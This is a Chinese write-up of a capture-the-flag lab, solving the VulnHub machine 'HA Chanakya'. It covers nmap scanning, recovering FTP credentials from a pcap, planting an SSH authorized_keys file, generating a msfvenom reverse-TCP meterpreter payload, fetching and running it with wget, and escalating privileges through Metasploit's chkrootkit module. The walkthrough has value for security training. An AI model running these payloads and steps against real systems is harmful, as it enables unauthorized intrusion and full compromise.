\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzI2ODU2MjM0OA==&mid=2247488146&idx=1&sn=ef4591a1a374e90bd8a080a8a031dbda&chksm=eaece851dd9b6147421fbcfca90462d31229bda17911aa3dc44e333c5755a3ca754f5b4f8b6a&mpshare=1&scene=1&srcid=1018mJhvHxMOzG8jdpTTsFE1&sharer\_sharetime=1602994498770&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=d1b2c53fcb9e77eeedbdc16b857a7b0e1bfd5f10d1466d33354874bdb892c41bd3c99b82637dd1d939b499b2b2bb2ad2a666a7e3f3ea9956a824eed6093591cf8016e48bb880ef263f62283903f950fd852d4a5fa659250c9e82a71289263cbdff839c3b39efdea87ca956889bb34e62b43fe7b8e13f3e4097ce17cb85b56e77&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=ARKaGAc89PCA5JOWuT6SRkQ%3D&pass\_ticket=fNc1mNErgeHhn4jm0DcjBlD5hkXepEyD08VA%2B16wYw5QmvtETgayFa%2BrZuz3ot9i&wx\_header=0)

****文章源自【字节脉搏社区】-字节脉搏实验室****

**作者-purplet**

**扫描下方二维码进入社区：**

**![](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnK3Fc7MgHHCICGGSg2l58vxaP5QwOCBcU48xz5g8pgSjGds3Oax0BfzyLkzE9Z6J4WARvaN6ic0GRQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)**

**HackTheNmae：HA Chanakya**

**The Mastermind that took down kingdoms is**

**back and this time he has created a puzzle that would make you scratch**

**you brains! It’s time to face Chanakya.**

**Will you be able to solve this Boot to Root and prove that you are wiser?**

**ENUMERATION IS THE KEY!!!!!**

**下载地址：https://www.vulnhub.com/entry/ha-chanakya,395/**

**难度：中等**

**目的：拿到 192.168.194 .128的 Root 权限**

**靶机IP：192.168.194.128**

**攻击机器IP：192.168.194.129**

****![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWgiazacZwcozhIIJkbibEWTcfRmJfpFw8RCkn9iaZOyT4YJ5JCqCIvRvCLC5RznuKbdPrlfXuXPkevEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)****

**一、信息收集**

**因为是在一个局域网中搭建的，且都通过NAT模式连接；已知KALI的IP为192.168.194.129，所以其他所有以NAT模式连接的机器都将分配C段IP。利用nmap的TCP半开放扫描探测目标机器。  
**

**nmap -sS 192.168.194.0/24**

****![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWgiazacZwcozhIIJkbibEWTcfRmJfpFw8RCkn9iaZOyT4YJ5JCqCIvRvCLC5RznuKbdPrlfXuXPkevEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)****

![](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnKj0icLmwNGQ4YOumLQuHzBV9MXxI8xhXTib7O6NGevTqktX9773rUHceIpqAme9VdxCxLO6wnyvrBA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**发现目标机器开放21 22 80端口**

****![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWgiazacZwcozhIIJkbibEWTcfRmJfpFw8RCkn9iaZOyT4YJ5JCqCIvRvCLC5RznuKbdPrlfXuXPkevEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)****

**二、渗透初始**

**利用dirsearch和dirb对网站目录进行扫描，得到一个敏感txt文件和两个文件夹**

****![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWgiazacZwcozhIIJkbibEWTcfRmJfpFw8RCkn9iaZOyT4YJ5JCqCIvRvCLC5RznuKbdPrlfXuXPkevEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)****

![](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnKj0icLmwNGQ4YOumLQuHzBVTmKRd7oy8fWeF8prLqOIKoGhDCftubaFRw8ic51YqQcJqD1WrpicNllg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnKj0icLmwNGQ4YOumLQuHzBVw8MKzRqhEuc8plqI29vZnSqD1KNo2tGboSW54aqBD311f5Hb0uzK3w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**访问http://192.168.194.128/abuse.txt**

**后得到"nfubxn.cpncat"内容，rot13解密后得到：**

**"ashoka.pcapng"，访问 http://192.168.194.128/ashoka.pcapng**

**下载得到该流量包。利用WireShark加载打开发现存在FTP协议登录的流量包信息，并找到登录FTP服务的用户名和密码ashoka/kautilya**

****![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWgiazacZwcozhIIJkbibEWTcfRmJfpFw8RCkn9iaZOyT4YJ5JCqCIvRvCLC5RznuKbdPrlfXuXPkevEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)****

![](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnKj0icLmwNGQ4YOumLQuHzBV4pU7NgFjcRyacAa4CDcMSKRicEATmb1DHXPiajufnaweQDf1Q1H7QibXQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**访问ftp://192.168.194.128输入用户名密码后登录**

****![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWgiazacZwcozhIIJkbibEWTcfRmJfpFw8RCkn9iaZOyT4YJ5JCqCIvRvCLC5RznuKbdPrlfXuXPkevEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**拿到FTP服务器后原本想上传个elf马执行回弹Shell，但是后来发现FTP服务上也没法运行啊。后来在网上找了一下，可以从 SSH 中的 id\_rsa.pub 下手！原理是：在KALI生成一个id\_rsa.pub的密匙，然后通过 FTP 来上传我们的密匙，因为它服务器上有我们的密匙，从而我们就可以用 SSH 来进行连接！**

**在KAli上生成公钥**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**然后我们把 id\_rsa.pub 里的内容重定向到 authorized\_keys 文件中，再移动到 /root/ 目录下，方便 FTP 上传：**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**Linux下登录FTP：ftp 192.168.194.128 输入用户名和密码**

**创建一个 .ssh 目录，上传 authorized\_keys 文件， 再上传 authorized\_keys 文件**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**ssh ashoka@192.168.194.128 输入yes之后成功登入**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

三、权限提升

**现在已经拿到一个Shell了，但是不是root权限的，接下来利用msfvenom在root目录下生成一个elf的木马。  
**

**msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.194.129 LPORT=6666 -f elf > shell.elf**

**在KAli的root目录下开启一个HTTP服务 python -m SimpleHTTPServer**

**默认开启8000端口，接下来通过wget下载shell.elf文件"wget**

**http://192.168.194.129:8000/shell.elf"，再chmod 777 shell.elf使其具有可执行权限。**

**这里踩了一个坑，通过FTP服务上传了shell.elf，结果无法运行，这是因为FTP服务上传的文件是root权限了，而通过wget下载的却是以ashoka用户身份下载。然后开启MSF。**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**补充：生成x86的反弹shell马是因为目标机器的系统版本是x86的，通过uname -a查看得到**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**拿到meterpreter的session后，使用POST模块查看可提权模块**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**接着bg将meterpreter的session放到后台**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**提权一波结果失败了，尝试使用一下命令注入：**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**run后会生成一段python代码，将这段代码放到目标及执行后会回弹一个Shell，但是回弹后的权限依然是普通用户权限**

**最后尝试利用chkrootkit模块提权，该模块有crontab，会定期以root身份执行/tmp/update文件。注：该模块使用前提是目标机器是Linux系统**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**python -c 'import pty;pty.spawn("/bin/bash")'**

****![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)****

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**通知！**

**公众号招募文章投稿小伙伴啦！只要你有技术有想法要分享给更多的朋友，就可以参与到我们的投稿计划当中哦~感兴趣的朋友公众号首页菜单栏点击【商务合作-我要投稿】即可。期待大家的参与~**

**![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)**

**记得扫码**

**关注我们**